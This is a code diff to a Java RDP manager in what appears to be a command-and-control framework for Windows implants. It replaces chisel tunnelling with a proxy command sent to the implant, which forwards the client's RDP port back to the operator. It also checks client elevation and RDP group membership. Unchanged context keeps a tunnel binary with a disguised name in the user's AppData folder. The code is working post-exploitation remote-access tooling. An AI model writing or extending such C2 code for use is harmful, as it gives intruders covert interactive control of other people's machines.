@@ -16,6 +16,7 @@ import java.util.Set;
 
 import c2.Constants;
 import c2.session.IOManager;
+import c2.session.ServersideCommandPreprocessor;
 import c2.win.WindowsCmdLineHelper;
 import util.WindowsCommandIssuer;
 
@@ -42,6 +43,8 @@ public class WindowsRDPManager {
 	// Holds onto references of started chisel listeners
 	private Set<Process> processes = new HashSet<>();
 
+	private ServersideCommandPreprocessor cmdPreprocessor;
+	
 	static {
 		String defaultClientChiselDir = "%APPDATA%\\nw_helper";
 		String defaultChiselWinBin = "clisel_win_64.exe";
@@ -76,16 +79,17 @@ public class WindowsRDPManager {
 		LOCAL_CHISEL_EXEC = defaultLocalChiselExec;
 	}
 
-	public WindowsRDPManager(IOManager io, int portStart, int numPorts) {
+	public WindowsRDPManager(IOManager io, int portStart, int numPorts, ServersideCommandPreprocessor cmdPreprocessor) {
 		this.io = io;
 		this.portStart = portStart;
 		this.numPorts = numPorts;
+		this.cmdPreprocessor = cmdPreprocessor;
 	}
 	
 	public void startup() throws Exception {
 		portMemoryManager = ChiselPortManager.loadFromConfig(Paths.get("rdp_persist"));
 		for(RDPSessionInfo info : portMemoryManager.getInfo()) {
-			setupLocalChiselListener(info);
+			startNewProxy(info, Integer.parseInt(info.sessionId));
 			currentSessions.put(info.sessionId, info);
 		}
 	}
@@ -125,7 +129,29 @@ public class WindowsRDPManager {
 		}
 
 		// if not, set up
-
+		int localListenRemoteForward;
+		RDPSessionInfo info = null;
+		if(existingSession == null) {
+			try {
+				localListenRemoteForward = getUnusedLocalPort();
+				info = new RDPSessionInfo(sessionId, localListenRemoteForward, -1 );
+				reportGenerator.append("Starting local listener - Remote forward: "+localListenRemoteForward);
+				reportGenerator.append(System.lineSeparator());
+				if(!startNewProxy(info, id)) {
+					throw new Exception("Can't start proxy");
+				}
+			} catch (Exception ex) {
+				ex.printStackTrace();
+				info = new RDPSessionInfo(sessionId, -1, -1);
+				info.addError(ex.getMessage());
+				return info;
+			}
+		}else {
+			reportGenerator.append("Using existing session");
+			reportGenerator.append(System.lineSeparator());
+			localListenRemoteForward = existingSession.localForwardPort;
+		}
+/*
 		int localListenClientIncoming;
 		int localListenRemoteForward;
 		RDPSessionInfo info = null;
@@ -151,7 +177,8 @@ public class WindowsRDPManager {
 			localListenClientIncoming = existingSession.localClientIncomingPort;
 			localListenRemoteForward = existingSession.localForwardPort;
 		}
-
+*/
+		/*
 		// check if chisel is on client
 		reportGenerator.append("Validating client has chisel");
 		reportGenerator.append(System.lineSeparator());
@@ -185,7 +212,7 @@ public class WindowsRDPManager {
 				return info;
 			}
 		}
-		
+		*/
 		
 
 		reportGenerator.append("Testing if client is elevated");
@@ -235,11 +262,36 @@ public class WindowsRDPManager {
 		io.sendIO(id, reportGenerator.toString());
 		return info;
 	}
+	
+	public boolean startNewProxy(RDPSessionInfo info, int id) {
+		String proxyStartCmd = "proxy 127.0.0.1 3389 " + info.localForwardPort;
+		io.sendCommand(id, proxyStartCmd);
+		String proxyStartCmdOut = io.awaitMultilineCommands(id);
+		if(proxyStartCmdOut.contains("Proxy established")) {
+			return true;
+		}else {
+			return false;
+		}
+	}
 
 	public boolean validateSessionReady(int id, String userForRDP, RDPSessionInfo info) {
+		/*
 		return validateServersideChisel(info) && validateClientsideChiselBinaryDeployed(id, info) &&
 				validateClientsideChiselRegistryDeployed(id, info)
 				&& validateClientsideChiselRunning(id, info) && validateUserInRDPGroup(id, userForRDP);
+				*/
+		return validateUserInRDPGroup(id, userForRDP) && cmdPreprocessor.haveActiveForward(id, "127.0.0.1:3389") &&
+				validateClientsideProxy(id);
+	}
+	
+	public boolean validateClientsideProxy(int sessionId) {
+		io.sendCommand(sessionId, "confirm_client_proxy 127.0.0.1:3389");
+		String proxyResults = io.awaitMultilineCommands(sessionId);
+		if(proxyResults.equals("yes")) {
+			return true;
+		}else {
+			return false;
+		}
 	}
 
 	public boolean validateServersideChisel(RDPSessionInfo info) {
